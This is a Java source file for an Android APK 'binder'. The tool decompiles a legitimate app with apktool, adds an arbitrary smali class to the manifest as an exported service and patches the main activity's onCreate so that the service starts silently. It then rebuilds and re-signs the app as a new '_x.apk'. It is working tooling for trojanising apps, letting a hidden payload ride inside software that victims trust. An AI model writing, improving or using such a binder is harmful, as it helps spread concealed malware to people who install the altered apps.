package binder;

import brut.apktool.Main;
import s.Sign;
import utils.*;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;

public class Binder {
    public interface ConsoleProcess{
        void onFinish(String output);
    }
    private ConsoleProcess consoleProcess;
    private Constants constants;
    private File manifestFile, epSmaliFile, newSmaliFile, newApkFile, signedApkFile;
    private String manifestContent, androidPackageName, epFilePath, smaliPackageName,  serviceElement, newSmaliFileContent, epSmaliFileContent, onCreateLine, serviceStarterSmali, onCreateMethod, oldMethod;
    private Matcher manifestMatcher;
    private int onCreateLineNum;

    public Binder(){
        constants = new Constants();
    }
    public void decompileApk(File apkFile, ConsoleProcess consoleProcess){
        this.consoleProcess = consoleProcess;
        String[] args = new String[]{"d", "-f", apkFile.getPath().trim()};
        runApktool(apkFile, args);
    }
    public void buildApk(File apkFile, ConsoleProcess consoleProcess){
        this.consoleProcess = consoleProcess;
        String[] args = new String[]{"b", apkFile.getPath().trim()};
        runApktool(apkFile, args);
    }
    private void runApktool(File apkFile, String[] args){
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            PrintStream printStream = System.out;
            System.setOut(new PrintStream(byteArrayOutputStream));
            if(apkFile.exists()) {
                Main.main(args);
            }else {
                throw new Exception(constants.APK_NOT_FOUND_ERROR);
            }
            System.out.flush();
            System.setOut(printStream);
            consoleProcess.onFinish(byteArrayOutputStream.toString());
        }catch (Exception ex){
            System.out.println(ex.getMessage());
            ex.printStackTrace();
            consoleProcess.onFinish(ex.getMessage());
        }
    }
    public void signApk(File apkFile, ConsoleProcess consoleProcess){
        try {
            if(apkFile.exists()) {
                Sign.main(new String[]{apkFile.getPath()});
                while (true){
                    Thread.sleep(500);
                    if(new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName())+".s.apk").exists()){
                        break;
                    }
                }
                consoleProcess.onFinish("[+] Apk signed.");
            }else{
                throw new Exception(constants.APK_NOT_FOUND_ERROR);
            }
        }catch (Exception e){
            e.printStackTrace();
            System.out.println(e.getMessage());
        }
    }
    public void bindApk(File apkFile, File smaliFile){
        /*
         * 1- Edit Manifest file -> Add service tags
         * 2- Edit service package
         * 3- Edit Smali file -> Start service
         * 4- Build and sign
         * */
        printLog("Decompiling APK with ApkTool...");
        if(apkFile.exists() && smaliFile.exists()){
            decompileApk(apkFile, output1 -> {
                try {
                    printLog("\n" + output1);
                    if(output1.split("I:")[output1.split("I:").length-1].contains("Copying original files...")) {  /* Check last info */
                        manifestFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\AndroidManifest.xml");
                        if (!manifestFile.exists()) { throw new Exception(constants.MANIFEST_NOT_FOUND_ERROR); }
                        printLog("Manifest file found: " + manifestFile.getName());
                        printLog("Trying to find EntryPoint smali...");
                        manifestContent = readFile(manifestFile.getPath()).replace("\n", "").replace("\r", "");
                        manifestMatcher = constants.manifestPattern1.matcher(manifestContent);
                        if (manifestMatcher.find()){
                            androidPackageName = manifestMatcher.group(0).replace("<activity android:name=\"", "")
                                    .replaceAll("\">(.+?)<intent-filter>(.+?)+", "");
                        }
                        printLog("EntryPoint smali: " + androidPackageName);
                        if(androidPackageName.length()<5 | androidPackageName.split("[.]").length == 0){ throw new Exception(constants.MANIFEST_PARSE_ERROR);}
                        epFilePath = manifestFile.getParent() + "\\smali";
                        for(int i = 0; i < androidPackageName.split("[.]").length-1; i++){
                            epFilePath += "\\" + androidPackageName.split("[.]")[i];
                        }
                        epFilePath += "\\" + androidPackageName.split("[.]")[androidPackageName.split("[.]").length-1] + ".smali";
                        epSmaliFile = new File(epFilePath);
                        if(!epSmaliFile.exists()){throw new Exception(constants.EP_SMALI_NOT_FOUND_ERROR);}
                        /*Edit Manifest*/
                        printLog("Changing manifest file...");
                        smaliPackageName = androidPackageName.replace("."+ androidPackageName.split("[.]")[androidPackageName.split("[.]").length-1], "") + "." +
                                getFilenameWithoutExtension(smaliFile.getName());
                        serviceElement = "<service android:enabled=\"true\" android:exported=\"true\" android:name=\""+ smaliPackageName + "\"/>";
                        if(!writeFile(manifestFile.getPath(), manifestContent.replace(manifestMatcher.group(0), manifestMatcher.group(0)+serviceElement))){
                            throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Copy smali and edit package*/
                        printLog("Moving and changing smali file...");
                        newSmaliFile = new File(epSmaliFile.getParent()+"\\"+smaliFile.getName());
                        if(!copyFile(smaliFile.getPath(), newSmaliFile.getPath())){ throw new Exception(constants.FILE_COPY_ERROR);}
                        String smaliPackage = readFile(newSmaliFile.getPath()).split("\n")[0].replace(".class public L", "").replace(";", "");
                        newSmaliFileContent = readFile(newSmaliFile.getPath()).replaceAll(".class(.+?)L(.+?)/(.+?);", ".class public L"+
                                smaliPackageName.replace(".", "/")+";").replace(smaliPackage, smaliPackageName.replace(".", "/"));
                        if(!writeFile(newSmaliFile.getPath(), newSmaliFileContent)){throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Edit EP File*/
                        printLog("Changing EntryPoint smali...");
                        epSmaliFileContent = readFile(epSmaliFile.getPath());
                        if(!epSmaliFileContent.contains(".method protected onCreate")){ throw new Exception(constants.ONCREATE_NOT_FOUND_ERROR);}
                        printLog("onCreate method found!");
                        String[] epLines = epSmaliFileContent.split(".method protected onCreate")[1].split(".line ");
                        onCreateMethod = ".method protected onCreate" + epSmaliFileContent.split(".method protected onCreate")[1]
                                .split(".end method")[0] + ".end method\n";
                        oldMethod = onCreateMethod;
                        boolean increment = false;
                        for(String epLine:epLines){
                            try{
                                int lineNum = Integer.valueOf(epLine.split("\n")[0].trim());
                                if(epLine.contains("->onCreate") && epLine.contains("Bundle")){
                                    onCreateLineNum = lineNum;
                                    onCreateLine = epLine.replace(String.valueOf(lineNum), "").replace("\n", "")
                                            .replace("\r", "").trim();
                                    serviceStarterSmali = "\n\n\t" + constants.service_starter_smali.replace("<line_num>", String.valueOf(onCreateLineNum+1))
                                            .replace("<class_name>", androidPackageName.replace(".", "/"))
                                            .replaceAll("<service_name>", smaliPackageName.replace(".", "/"));
                                    onCreateMethod =  onCreateMethod.replace(onCreateLine, onCreateLine + "" + serviceStarterSmali);
                                    increment = true;
                                }
                                if(increment){
                                    String line = ".line " + epLine;
                                    onCreateMethod = onCreateMethod.replace(line, line.replace(".line " + String.valueOf(lineNum), ".line " +
                                            String.valueOf(lineNum+1)));
                                }
                            }catch (Exception e){
                                /*Cannot convert*/
                            }
                        }
                        printLog("Building the APK...");
                        if(!writeFile(epSmaliFile.getPath(), epSmaliFileContent.replace(oldMethod, onCreateMethod))){ throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Build and Sign APK*/
                        buildApk(new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName())), output2 -> {
                            try {
                                printLog("\n" + output2);
                                if (output2.split("I:")[output2.split("I:").length - 1].contains("Built apk...")) {  /* Check last info */
                                    newApkFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\dist\\" + apkFile.getName());
                                    if(!newApkFile.exists()){throw new Exception(constants.NEW_APK_NOT_FOUND_ERROR);}
                                    TimeUnit.SECONDS.sleep(1);
                                    printLog("Signing...");
                                    signApk(newApkFile, output3 -> {
                                        try {
                                            if (output3.equals("[+] Apk signed.")) {
                                                signedApkFile = new File(newApkFile.getParent() + "\\" + getFilenameWithoutExtension(newApkFile.getName())+".s.apk");
                                                if(!signedApkFile.exists()){throw new Exception(constants.APK_SIGN_ERROR);}
                                                if(!copyFile(signedApkFile.getPath(), apkFile.getParent() + "\\" +
                                                        getFilenameWithoutExtension(apkFile.getName()) + "_x.apk")){throw new Exception(constants.FILE_COPY_ERROR);}
                                                        /* DONE */
                                                printLog("APK signed. ~ done");
                                                System.out.println();
                                                printLog("New APK located at \"" + apkFile.getParent() + "\\" +
                                                        getFilenameWithoutExtension(apkFile.getName()) + "_x.apk" + "\"");
                                                // // TODO: 6/27/2018 Delete temp files
                                            } else {
                                                throw new Exception(constants.APK_SIGN_ERROR);
                                            }
                                        }catch (Exception e){
                                            e.printStackTrace();
                                            System.out.println(e.getMessage());
                                        }
                                    });
                                } else {
                                    throw new Exception(output2);
                                }
                            }catch (Exception e){
                                e.printStackTrace();
                                System.out.println(e.getMessage());
                            }
                        });

                    }else{
                        throw new Exception(output1);
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    System.out.println(e.getMessage());
                }
            });
        }else{
            System.out.println(constants.SMALI_NOT_FOUND_ERROR);
        }
    }
    private String readFile(String filePath){
        StringBuilder content = new StringBuilder();
        String line;
        File file = new File(filePath);
        if(file.exists()){
            try {
                BufferedReader in = new BufferedReader(new FileReader(file.getPath()));
                while ((line = in.readLine()) != null) {
                    content.append(line);
                    content.append("\n");
                }
                in.close();
            }catch (IOException e){
                e.printStackTrace();
            }
        }
        return content.toString();
    }
    private boolean writeFile(String filePath, String content){
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter(filePath));
            writer.write(content);
            writer.close();
            return true;
        }catch (IOException e){
            e.printStackTrace();
            return false;
        }
    }
    private boolean copyFile(String src, String dst){
        try {
            Files.copy(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);
            return true;
        }catch (IOException e){
            e.printStackTrace();
            return false;
        }
    }
    private void printLog(String msg){
        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        System.out.println("[" + dateFormat.format(new Date()) + "] " + msg);
    }
    private String getFilenameWithoutExtension(String filename){
        return filename.replaceFirst("[.][^.]+$", "");
    }
}
